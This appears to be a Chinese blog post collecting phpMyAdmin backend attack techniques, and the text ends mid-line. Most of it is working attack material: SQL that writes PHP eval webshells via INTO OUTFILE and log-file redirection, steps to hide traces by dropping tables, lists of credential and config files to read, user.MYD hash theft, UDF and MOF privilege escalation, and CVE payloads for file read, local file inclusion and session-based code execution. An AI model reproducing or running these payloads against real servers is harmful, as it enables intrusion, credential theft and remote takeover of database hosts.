    <content type="html"><![CDATA[<h1 id="phpmyadmin-后台-getshell-及漏洞利用思路整理"><a href="#phpmyadmin-后台-getshell-及漏洞利用思路整理" class="headerlink" title="phpmyadmin 后台 getshell 及漏洞利用思路整理"></a>phpmyadmin 后台 getshell 及漏洞利用思路整理</h1><h2 id="0x01-信息收集思路"><a href="#0x01-信息收集思路" class="headerlink" title="0x01 信息收集思路"></a>0x01 信息收集思路</h2><h3 id="1-网站绝对路径"><a href="#1-网站绝对路径" class="headerlink" title="1. 网站绝对路径"></a>1. 网站绝对路径</h3><h4 id="1-1-mysql路径"><a href="#1-1-mysql路径" class="headerlink" title="1.1 mysql路径"></a>1.1 mysql路径</h4><p>如果是类似phpstudy这样的集成工具，那么查询出mysql路径也就可以找到网站路径了。</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> version();  <span class="hljs-comment">-- 查看数据库版本</span><span class="hljs-keyword">select</span> @<span class="hljs-variable">@datadir</span>;  <span class="hljs-comment">-- 查看数据库存储路径</span><span class="hljs-keyword">show</span> VARIABLES <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%char%&#x27;</span>;  <span class="hljs-comment">-- 查看系统变量</span><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%plugin%&#x27;</span>; <span class="hljs-comment">-- 查看插件路径</span></code></pre></div><h4 id="1-2-phpinfo"><a href="#1-2-phpinfo" class="headerlink" title="1.2 phpinfo()"></a>1.2 phpinfo()</h4><p>可以直接显示web路径</p><h4 id="1-3-读取配置文件"><a href="#1-3-读取配置文件" class="headerlink" title="1.3 读取配置文件"></a>1.3 读取配置文件</h4><p>如果注入点有文件读取权限，可通过 load_file 尝试读取配置文件</p><p>windows 敏感文件</p><div class="hljs code-wrapper"><pre><code class="hljs cmd"><span class="hljs-function">c:/<span class="hljs-title">boot.ini</span> //查看系统版本 </span><span class="hljs-function"><span class="hljs-title">c</span>:/<span class="hljs-title">windows</span>/<span class="hljs-title">php.ini</span> //<span class="hljs-title">php</span>配置信息 </span><span class="hljs-function"><span class="hljs-title">c</span>:/<span class="hljs-title">windows</span>/<span class="hljs-title">my.ini</span> //<span class="hljs-title">MYSQL</span>配置文件，记录管理员登陆过的<span class="hljs-title">MYSQL</span>用户名和密码 </span><span class="hljs-function"><span class="hljs-title">c</span>:/<span class="hljs-title">winnt</span>/<span class="hljs-title">php.ini</span> </span><span class="hljs-function"><span class="hljs-title">c</span>:/<span class="hljs-title">winnt</span>/<span class="hljs-title">my.ini</span> </span><span class="hljs-function"><span class="hljs-title">c</span>:\<span class="hljs-title">mysql</span>\<span class="hljs-title">data</span>\<span class="hljs-title">mysql</span>\<span class="hljs-title">user.MYD</span> //存储了<span class="hljs-title">mysql.user</span>表中的数据库连接密码 </span><span class="hljs-function"><span class="hljs-title">c</span>:\<span class="hljs-title">Program</span> <span class="hljs-title">Files</span>\<span class="hljs-title">RhinoSoft.com</span>\<span class="hljs-title">Serv</span>-<span class="hljs-title">U</span>\<span class="hljs-title">ServUDaemon.ini</span> //存储了虚拟主机网站路径和密码 </span><span class="hljs-function"><span class="hljs-title">c</span>:\<span class="hljs-title">Program</span> <span class="hljs-title">Files</span>\<span class="hljs-title">Serv</span>-<span class="hljs-title">U</span>\<span class="hljs-title">ServUDaemon.ini</span> </span><span class="hljs-function"><span class="hljs-title">c</span>:\<span class="hljs-title">windows</span>\<span class="hljs-title">system32</span>\<span class="hljs-title">inetsrv</span>\<span class="hljs-title">MetaBase.xml</span> 查看<span class="hljs-title">IIS</span>的虚拟主机配置 </span><span class="hljs-function"><span class="hljs-title">c</span>:\<span class="hljs-title">windows</span>\<span class="hljs-title">repair</span>\<span class="hljs-title">sam</span> //存储了<span class="hljs-title">WINDOWS</span>系统初次安装的密码 </span><span class="hljs-function"><span class="hljs-title">c</span>:\<span class="hljs-title">Program</span> <span class="hljs-title">Files</span>\ <span class="hljs-title">Serv</span>-<span class="hljs-title">U</span>\<span class="hljs-title">ServUAdmin.exe</span> //6.0版本以前的<span class="hljs-title">serv</span>-<span class="hljs-title">u</span>管理员密码存储于此 </span><span class="hljs-function"><span class="hljs-title">c</span>:\<span class="hljs-title">Program</span> <span class="hljs-title">Files</span>\<span class="hljs-title">RhinoSoft.com</span>\<span class="hljs-title">ServUDaemon.exe</span> </span><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Documents</span> <span class="hljs-title">and</span> <span class="hljs-title">Settings</span>\<span class="hljs-title">All</span> <span class="hljs-title">Users</span>\<span class="hljs-title">Application</span> <span class="hljs-title">Data</span>\<span class="hljs-title">Symantec</span>\<span class="hljs-title">pcAnywhere</span>\*.<span class="hljs-title">cif</span>文件 </span><span class="hljs-function">//存储了<span class="hljs-title">pcAnywhere</span>的登陆密码 </span><span class="hljs-function"><span class="hljs-title">c</span>:\<span class="hljs-title">Program</span> <span class="hljs-title">Files</span>\<span class="hljs-title">Apache</span> <span class="hljs-title">Group</span>\<span class="hljs-title">Apache</span>\<span class="hljs-title">conf</span>\<span class="hljs-title">httpd.conf</span> 或<span class="hljs-title">C</span>:\<span class="hljs-title">apache</span>\<span class="hljs-title">conf</span>\<span class="hljs-title">httpd.conf</span> //查看<span class="hljs-title">WINDOWS</span>系统<span class="hljs-title">apache</span>文件 </span><span class="hljs-function"><span class="hljs-title">c</span>:/<span class="hljs-title">Resin</span>-3.0.14/<span class="hljs-title">conf</span>/<span class="hljs-title">resin.conf</span> //查看<span class="hljs-title">jsp</span>开发的网站 <span class="hljs-title">resin</span>文件配置信息. </span><span class="hljs-function"><span class="hljs-title">c</span>:/<span class="hljs-title">Resin</span>/<span class="hljs-title">conf</span>/<span class="hljs-title">resin.conf</span> /<span class="hljs-title">usr</span>/<span class="hljs-title">local</span>/<span class="hljs-title">resin</span>/<span class="hljs-title">conf</span>/<span class="hljs-title">resin.conf</span> 查看<span class="hljs-title">linux</span>系统配置的<span class="hljs-title">JSP</span>虚拟主机 </span><span class="hljs-function"><span class="hljs-title">d</span>:\<span class="hljs-title">APACHE</span>\<span class="hljs-title">Apache2</span>\<span class="hljs-title">conf</span>\<span class="hljs-title">httpd.conf</span> </span><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Program</span> <span class="hljs-title">Files</span>\<span class="hljs-title">mysql</span>\<span class="hljs-title">my.ini</span> </span><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">mysql</span>\<span class="hljs-title">data</span>\<span class="hljs-title">mysql</span>\<span class="hljs-title">user.MYD</span> 存在<span class="hljs-title">MYSQL</span>系统中的用户密码</span></code></pre></div><p>linux 敏感文件</p><div class="hljs code-wrapper"><pre><code class="hljs cmd">/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件 /usr/local/apache2/conf/httpd.conf /usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置 /usr/local/app/php5/lib/php.ini //PHP相关设置 /etc/sysconfig/iptables //从中得到防火墙规则策略 /etc/httpd/conf/httpd.conf // apache配置文件 /etc/rsyncd.conf //同步程序配置文件 /etc/my.cnf //mysql的配置文件 /etc/redhat-release //系统版本 /etc/issue /etc/issue.<span class="hljs-built_in">net</span> /usr/local/app/php5/lib/php.ini //PHP相关设置 /usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置 /etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件/usr/local/resin-<span class="hljs-number">3</span>.<span class="hljs-number">0</span>.<span class="hljs-number">22</span>/conf/resin.conf 针对<span class="hljs-number">3</span>.<span class="hljs-number">0</span>.<span class="hljs-number">22</span>的RESIN配置文件查看 /usr/local/resin-pro-<span class="hljs-number">3</span>.<span class="hljs-number">0</span>.<span class="hljs-number">22</span>/conf/resin.conf 同上 /usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看 /etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf 查看linux APACHE虚拟主机配置文件 /usr/local/resin-<span class="hljs-number">3</span>.<span class="hljs-number">0</span>.<span class="hljs-number">22</span>/conf/resin.conf 针对<span class="hljs-number">3</span>.<span class="hljs-number">0</span>.<span class="hljs-number">22</span>的RESIN配置文件查看 /usr/local/resin-pro-<span class="hljs-number">3</span>.<span class="hljs-number">0</span>.<span class="hljs-number">22</span>/conf/resin.conf 同上 /usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看 /etc/sysconfig/iptables 查看防火墙策略 load_file(char(<span class="hljs-number">47</span>)) 可以列出FreeBSD,Sunos系统根目录 <span class="hljs-built_in">replace</span>(load_file(<span class="hljs-number">0</span>×<span class="hljs-number">2</span>F6574632F706173737764),<span class="hljs-number">0</span>×<span class="hljs-number">3</span>c,<span class="hljs-number">0</span>×<span class="hljs-number">20</span>) <span class="hljs-built_in">replace</span>(load_file(char(<span class="hljs-number">47</span>,<span class="hljs-number">101</span>,<span class="hljs-number">116</span>,<span class="hljs-number">99</span>,<span class="hljs-number">47</span>,<span class="hljs-number">112</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">115</span>,<span class="hljs-number">119</span>,<span class="hljs-number">100</span>)),char(<span class="hljs-number">60</span>),char(<span class="hljs-number">32</span>))</code></pre></div><p>配置文件目录可以通过字典进行爆破。</p><h4 id="1-4-利用报错信息"><a href="#1-4-利用报错信息" class="headerlink" title="1.4 利用报错信息"></a>1.4 利用报错信息</h4><p>如果网站开启了报错信息，通过报错信息很容易找到网站根路径。不仅仅是mysql报错信息。</p><h4 id="1-5-利用-Google"><a href="#1-5-利用-Google" class="headerlink" title="1.5 利用 Google"></a>1.5 利用 <code>Google</code></h4><div class="hljs code-wrapper"><pre><code class="hljs vbnet"><span class="hljs-symbol">site:</span>xxx.com warning<span class="hljs-symbol">site:</span>xxx.com “fatal <span class="hljs-keyword">error</span>”</code></pre></div><h4 id="1-6-利用测试文件"><a href="#1-6-利用测试文件" class="headerlink" title="1.6 利用测试文件"></a>1.6 利用测试文件</h4><div class="hljs code-wrapper"><pre><code class="hljs stylus">www<span class="hljs-selector-class">.xxx</span>.com/test.phpwww<span class="hljs-selector-class">.xxx</span>.com/ceshi.phpwww<span class="hljs-selector-class">.xxx</span>.com/info.phpwww<span class="hljs-selector-class">.xxx</span>.com/phpinfo.phpwww<span class="hljs-selector-class">.xxx</span>.com/php_info.phpwww<span class="hljs-selector-class">.xxx</span>.com/<span class="hljs-number">1</span>.php</code></pre></div><p>可以去寻找测试文件字典。</p><h4 id="1-7-访问一些特定的网页"><a href="#1-7-访问一些特定的网页" class="headerlink" title="1.7 访问一些特定的网页"></a>1.7 访问一些特定的网页</h4><p>下面一些网页可能会产生报错信息，从而可以得到网站根路径</p><div class="hljs code-wrapper"><pre><code class="hljs awk">phpMyAdmin<span class="hljs-regexp">/libraries/</span>selectlang.lib.phpphpMyAdmin<span class="hljs-regexp">/darkblueorange/</span>layout.inc.phpphpmyadmin<span class="hljs-regexp">/themes/</span>darkblue_orange/layout.inc.phpphpMyAdmin/index.php?lang[]=<span class="hljs-number">1</span>phpMyAdmin<span class="hljs-regexp">/darkblueorange/</span>layout.inc.php phpMyAdmin/index.php?lang[]=<span class="hljs-number">1</span><span class="hljs-regexp">/phpmyadmin/</span>libraries/lect_lang.lib.php<span class="hljs-regexp">/phpMyAdmin/</span>phpinfo.php<span class="hljs-regexp">/phpmyadmin/</span>themes<span class="hljs-regexp">/darkblue_orange/</span>layout.inc.php<span class="hljs-regexp">/phpmyadmin/</span>libraries/select_lang.lib.php<span class="hljs-regexp">/phpmyadmin/</span>libraries/mcrypt.lib.php</code></pre></div><h3 id="2-账户是否有读写权限"><a href="#2-账户是否有读写权限" class="headerlink" title="2. 账户是否有读写权限"></a>2. 账户是否有读写权限</h3><p>写入 <code>shell</code> 时遇到报错，可能是权限的原因</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> mysql.user;                <span class="hljs-operator">/</span><span class="hljs-operator">/</span>查询所有用户权限<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> mysql.user <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span><span class="hljs-operator">=</span>&quot;root&quot;;        <span class="hljs-operator">/</span><span class="hljs-operator">/</span>查询root用户权限update <span class="hljs-keyword">user</span> <span class="hljs-keyword">set</span> File_priv <span class="hljs-operator">=</span><span class="hljs-string">&#x27;Y&#x27;</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;root&#x27;</span>;      <span class="hljs-operator">/</span><span class="hljs-operator">/</span>允许root用户读写文件update <span class="hljs-keyword">user</span> <span class="hljs-keyword">set</span> File_priv <span class="hljs-operator">=</span><span class="hljs-string">&#x27;N&#x27;</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;root&#x27;</span>;      <span class="hljs-operator">/</span><span class="hljs-operator">/</span>禁止root用户读写文件flush privileges;                    <span class="hljs-operator">/</span><span class="hljs-operator">/</span>刷新MySQL系统权限相关表</code></pre></div><h3 id="3-路径是否具有读写权限"><a href="#3-路径是否具有读写权限" class="headerlink" title="3. 路径是否具有读写权限"></a>3. 路径是否具有读写权限</h3><h4 id="3-1-secure-file-priv-权限"><a href="#3-1-secure-file-priv-权限" class="headerlink" title="3.1 secure_file_priv 权限"></a>3.1 secure_file_priv 权限</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> @<span class="hljs-variable">@secure</span>_file_priv;   <span class="hljs-comment">-- 查询secure_file_priv</span> <span class="hljs-comment">-- secure_file_priv=NULL,禁止导入导出</span> <span class="hljs-comment">-- secure_file_priv=&#x27;&#x27;,不限制导入导出，Linux下默认/tmp目录可写</span> <span class="hljs-comment">-- secure_file_priv=/path/,只能向指定目录导入导出</span></code></pre></div><blockquote><p>在 <code>my.ini</code>、<code>my.cnf</code>、<code>mysqld.cnf</code> 文件中找到 <code>secure_file_prive</code> 并将其值设置为 “”或”/“，重启 MySQL 服务！</p></blockquote><blockquote><p>这是通用方法，在 <code>phpstudy</code> 中的 <code>mysql</code> 的配置文件中是没有这个参数的</p><p>所以我们自己在配置文件中添加一行 <code>secure_file_priv =</code> 即可。</p></blockquote><h4 id="3-2-日志读写权限"><a href="#3-2-日志读写权限" class="headerlink" title="3.2 日志读写权限"></a>3.2 日志读写权限</h4><p>查看日志状态：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> variables  <span class="hljs-keyword">like</span>  <span class="hljs-string">&#x27;%general%&#x27;</span>;<span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%slow%&#x27;</span>; <span class="hljs-comment">-- 慢查询日志</span></code></pre></div><p>general 开启时，所执行的 <code>sql</code> 语句都会出现在 <strong><em>*</em></strong>.log 文件。</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SET</span> <span class="hljs-keyword">GLOBAL</span> general_log<span class="hljs-operator">=</span><span class="hljs-string">&#x27;on&#x27;</span></code></pre></div><p>如果将general_log_file的值换成shell路径</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SET</span> <span class="hljs-keyword">GLOBAL</span> general_log_file <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;C:/phpStudy/WWW/shell.php&#x27;</span></code></pre></div><p>然后执行简单的查询</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;123&quot;]);?&gt;&#x27;</span></code></pre></div><p>即可写入shell</p><h2 id="0x02-后台写shell思路"><a href="#0x02-后台写shell思路" class="headerlink" title="0x02 后台写shell思路"></a>0x02 后台写shell思路</h2><h3 id="1-常规into-outfile-amp-into-dumpfile"><a href="#1-常规into-outfile-amp-into-dumpfile" class="headerlink" title="1. 常规into outfile&amp;into dumpfile"></a>1. 常规into outfile&amp;into dumpfile</h3><p>两者有所区别</p><blockquote><p>into outfile 主要的目的是导出 文本文件，我们在渗透过程中是用来写 shell 的<br>into dumpfile 的主要目的是导出二进制文件，在后面我们讲到 UDF 提权的过程中会经常用到这个函数生成我们的 udf.dll</p></blockquote><p>写shell主要用outfile</p><p><strong>需要条件：</strong></p><ul><li>当前的数据库用户有写权限</li><li>知道 web 绝对路径</li><li>web 路径能写</li></ul><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php @eval($_POST[soap]);?&gt;&#x27;</span> <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;C:\\phpstudy\\PHPTutorial\\WWW\\</span></code></pre></div><blockquote><p>注意，如果是在 <code>phpmyadmin</code> 的 <code>sql</code> 语句中执行写入的话，路径只能是斜杠 / 或者双反斜杠 \\</p></blockquote><p>目录不可写时可尝试其他可写的路径</p><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli"><span class="hljs-string">/upload</span><span class="hljs-string">/templates</span><span class="hljs-string">/cache</span>写入中文路径</code></pre></div><p>写入中文路径 shell</p><div class="hljs code-wrapper"><pre><code class="hljs sh"><span class="hljs-built_in">set</span> character_set_client=<span class="hljs-string">&#x27;gbk&#x27;</span>;<span class="hljs-built_in">set</span> character_set_connection=<span class="hljs-string">&#x27;gbk&#x27;</span>;<span class="hljs-built_in">set</span> character_set</code></pre></div><h3 id="2-创建表-getshell"><a href="#2-创建表-getshell" class="headerlink" title="2. 创建表 getshell"></a>2. 创建表 getshell</h3><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `mysql`.`xxxxx` (`content` TEXT <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> );<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `mysql`.`xxxxx` (`content` ) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;&lt;?php @eval($_POST[soap]);?&gt;&#x27;</span>);<span class="hljs-keyword">SELECT</span> `content` <span class="hljs-keyword">FROM</span> `mysql`.`xxxxx` <span class="hljs-keyword">INTO</span> OUTFILE <span class="hljs-string">&#x27;C:\\phpstudy\\PHPTutorial\\WWW\\test3.php&#x27;</span>;或者<span class="hljs-keyword">Create</span> <span class="hljs-keyword">TABLE</span> xxxxx (content text <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>);<span class="hljs-keyword">Insert</span> <span class="hljs-keyword">INTO</span> xxxxx (content) <span class="hljs-keyword">VALUES</span>(<span class="hljs-string">&#x27;&lt;?php @eval($_POST[pass]);?&gt;&#x27;</span>);<span class="hljs-keyword">select</span> `content` <span class="hljs-keyword">from</span> mysql.xxxxx <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;C:\\phpstudy\\PHPTutorial\\WWW\\test3.php&#x27;</span>;然后删除所建的表抹去痕迹<span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> `mysql`.`xxxxx`;</code></pre></div><h3 id="3-日志-getshell"><a href="#3-日志-getshell" class="headerlink" title="3. 日志 getshell"></a>3. 日志 getshell</h3><h4 id="3-1-general日志"><a href="#3-1-general日志" class="headerlink" title="3.1 general日志"></a>3.1 general日志</h4><p>查看日志状态：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> variables  <span class="hljs-keyword">like</span>  <span class="hljs-string">&#x27;%general%&#x27;</span>;</code></pre></div><p>general 开启时，所执行的 <code>sql</code> 语句都会出现在 <strong><em>*</em></strong>.log 文件。</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SET</span> <span class="hljs-keyword">GLOBAL</span> general_log<span class="hljs-operator">=</span><span class="hljs-string">&#x27;on&#x27;</span></code></pre></div><p>如果将general_log_file的值换成shell路径</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SET</span> <span class="hljs-keyword">GLOBAL</span> general_log_file <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;C:/phpStudy/WWW/shell.php&#x27;</span></code></pre></div><p>然后执行简单的查询</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;123&quot;]);?&gt;&#x27;</span></code></pre></div><p>即可写入shell</p><h4 id="3-2-慢查询写-shell"><a href="#3-2-慢查询写-shell" class="headerlink" title="3.2 慢查询写 shell"></a>3.2 慢查询写 shell</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%slow%&#x27;</span>;</code></pre></div><p>重新设置路径：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">set</span> <span class="hljs-keyword">GLOBAL</span> slow_query_log_file<span class="hljs-operator">=</span><span class="hljs-string">&#x27;C:/phpstudy/PHPTutorial/WWW/slow.php&#x27;</span>;</code></pre></div><p>开启慢查询日志：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">set</span> <span class="hljs-keyword">GLOBAL</span> slow_query_log<span class="hljs-operator">=</span><span class="hljs-keyword">on</span>;</code></pre></div><p>执行写入日志：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php eval($_POST[&quot;soap&quot;]);?&gt;&#x27;</span> <span class="hljs-keyword">from</span> mysql.db <span class="hljs-keyword">where</span> sleep(<span class="hljs-number">10</span>);</code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210321161304678.png" alt="image-20210321161304678"></p><h3 id="4-低权限读user-MYD提权"><a href="#4-低权限读user-MYD提权" class="headerlink" title="4. 低权限读user.MYD提权"></a>4. 低权限读user.MYD提权</h3><p>读user.MYD的目的是为了能够提取到root用户的hash，通过破解即可使用root用户登录，进而提权。</p><p>首先需要定位user.MYD文件路径，我们可以先查询mysql路径。</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> @<span class="hljs-variable">@basedir</span>;</code></pre></div><p>user.MYD文件存储在@@basedir\data\mysql\user.MYD</p><p>依次执行</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> ttt(ddd text);load data <span class="hljs-keyword">local</span> infile <span class="hljs-string">&#x27;C:\\phpStudy\\MySQL\\data\\mysql\\user.MYD&#x27;</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">table</span> ttt fields terminated <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;&#x27;</span> LINES TERMINATED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;\0&#x27;</span>;<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> ttt;</code></pre></div><p>但是读取的不全，phpmyadmin中没法正常显示。</p><p>渗透测试场景中，如果能够导出user.MYD文件，就可以进行hash 的获取。</p><p>具体可以参考</p><p><a href="http://www.dengb.com/wzaq/1017388.html">获取MySQL中user.MYD中hash技巧</a></p><h3 id="5-UDF提权"><a href="#5-UDF提权" class="headerlink" title="5. UDF提权"></a>5. UDF提权</h3><p><strong>条件</strong>：</p><ul><li>具有写权限</li><li>插件目录可写（或者可以更改指定的插件目录）</li></ul><p>具体情况要看目标 mysql 的版本：</p><ul><li>Mysql version &gt; 5.1 时，dll 或者 so 必须位于 mysql 安装目录 libplugin 下，当对该目录具有写权限时可以利用，查看：<br><code>show variables like %plugin%;</code>// 查看插件目录</li><li>5.0 &lt;= Mysql version &lt;5.1 时，需要导出至目标服务器的系统目录，如 C://Windows/System32</li><li>Mysql version &lt; 5.0 时，目录可以自定义具体利用如下：</li></ul><p>具体流程可以参考：<a href="https://coomrade.github.io/2018/09/12/MYSQL%E5%86%99shell%E4%B8%8E%E6%8F%90%E6%9D%83/">MYSQL写shell与提权</a></p><h3 id="6-MOF-提权"><a href="#6-MOF-提权" class="headerlink" title="6. MOF 提权"></a>6. MOF 提权</h3><p>通过 <code>mysql</code> 将文件写入一个 <code>MOF</code> 文件替换掉原有的 <code>MOF</code> 文件，然后系统每隔五秒就会执行一次上传的 <code>MOF</code>。</p><p>一般适用于 <code>Windows &lt;= 2003</code>，并且 <code>C:\Windows\System32\mof</code> 目录具有写权限（一般是没有权限写）。</p><p>可以使用 <code>MSF</code> 直接利用：<code>exploit/windows/mysql/mysql_mof</code></p><h2 id="0x03-可利用漏洞"><a href="#0x03-可利用漏洞" class="headerlink" title="0x03 可利用漏洞"></a>0x03 可利用漏洞</h2><h3 id="CVE-2013-3238"><a href="#CVE-2013-3238" class="headerlink" title="CVE-2013-3238"></a>CVE-2013-3238</h3><p>影响版本：3.5.x &lt; 3.5.8.1 and 4.0.0 &lt; 4.0.0-rc3 ANYUN.ORG<br>利用模块：exploit/multi/http/phpmyadminpregreplace</p><h3 id="CVE-2012-5159"><a href="#CVE-2012-5159" class="headerlink" title="CVE-2012-5159"></a>CVE-2012-5159</h3><p>影响版本：phpMyAdmin v3.5.2.2<br>利用模块：exploit/multi/http/phpmyadmin3522_backdoor</p><h3 id="CVE-2009-1151"><a href="#CVE-2009-1151" class="headerlink" title="CVE-2009-1151"></a>CVE-2009-1151</h3><p>PhpMyAdmin配置文件/config/config.inc.php存在命令执行<br>影响版本：2.11.x &lt; 2.11.9.5 and 3.x &lt; 3.1.3.1<br>利用模块：exploit/unix/webapp/phpmyadmin_config<br>弱口令&amp;万能密码<br>弱口令：版本phpmyadmin2.11.9.2， 直接root用户登陆，无需密码</p><h3 id="低版本万能密码"><a href="#低版本万能密码" class="headerlink" title="低版本万能密码"></a>低版本万能密码</h3><p>版本2.11.3 / 2.11.4，用户名‘localhost’@‘@”则登录成功</p><h3 id="WooYun-2016-199433：任意文件读取漏洞"><a href="#WooYun-2016-199433：任意文件读取漏洞" class="headerlink" title="WooYun-2016-199433：任意文件读取漏洞"></a><code>WooYun-2016-199433</code>：任意文件读取漏洞</h3><p>影响 phpMyAdmin<code>2.x</code> 版本</p><div class="hljs code-wrapper"><pre><code class="hljs http">POST /scripts/setup.php HTTP/1.1 Host: your-ip:8080Accept-Encoding: gzip, deflate Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trid ent/5.0)Connection: closeContent-Type: application/x-www-form-urlencoded Content-Length: 80action=test&amp;configuration=O:10:&quot;PMA_Config&quot;:1:&#123;s:6:&quot;source&quot;,s:11:&quot;/etc/passwd&quot;;&#125;</code></pre></div><h3 id="CVE-2014-8959：本地文件包含"><a href="#CVE-2014-8959：本地文件包含" class="headerlink" title="CVE-2014 -8959：本地文件包含"></a>CVE-2014 -8959：本地文件包含</h3><p>影响范围：<code>phpMyAdmin 4 .0.1--4 .2.12</code>，需要 <code>PHP version &lt; 5.3.4</code></p><div class="hljs code-wrapper"><pre><code class="hljs http">/gis_data_editor.php?token=2941949d3768c57b4342d94ace606e91&amp;gis_data[gis_type]=/../../../../phpinfo.txt%00    # 注意改下token值</code></pre></div><p>在实际利用中可以利用写入文件到 <code>/tmp</code> 目录下结合此漏洞完成 <code>RCE</code>.</p><h3 id="CVE-2016-5734-：后台-RCE"><a href="#CVE-2016-5734-：后台-RCE" class="headerlink" title="CVE-2016-5734 ：后台 RCE"></a>CVE-2016-5734 ：后台 RCE</h3><p>影响范围：PhpMyAdmin<code>4 .0.x-4 .6.2</code>，需要 <code>PHP 4.3.0-5.4.6 versions</code></p><div class="hljs code-wrapper"><pre><code class="hljs python">cve-<span class="hljs-number">2016</span>-<span class="hljs-number">5734.</span>py -u root --pwd=<span class="hljs-string">&quot;&quot;</span> http://localhost/pma -c <span class="hljs-string">&quot;system(&#x27;ls -lua&#x27;);&quot;</span></code></pre></div><p>poc地址：<a href="https://www.exploit-db.com/exploits/40185">https://www.exploit-db.com/exploits/40185</a></p><h3 id="CVE-2018-12613：后台文件包含"><a href="#CVE-2018-12613：后台文件包含" class="headerlink" title="CVE-2018-12613：后台文件包含"></a>CVE-2018-12613：后台文件包含</h3><p><code>phpMyAdmin 4.8.0</code> 和 <code>4.8.1</code>，经过验证可实现任意文件包含。</p><p>漏洞验证：</p><div class="hljs code-wrapper"><pre><code class="hljs awk">http:<span class="hljs-regexp">//y</span>our-ip:<span class="hljs-number">8080</span><span class="hljs-regexp">/index.php?target=db_sql.php%253f/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd</code></pre></div><p>rce利用：包含session文件</p><p>执行 <code>SQL</code> 语句，将 <code>PHP</code> 代码写入 <code>Session</code> 文件中：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php phpinfo();exit;?&gt;&#x27;</span></code></pre></div><p>包含 <code>session</code> 文件：</p><div class="hljs code-wrapper"><pre><code class="hljs url">http:&#x2F;&#x2F;10.1.1.10&#x2F;index.php?target&#x3D;db_sql.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sess_*** # *** 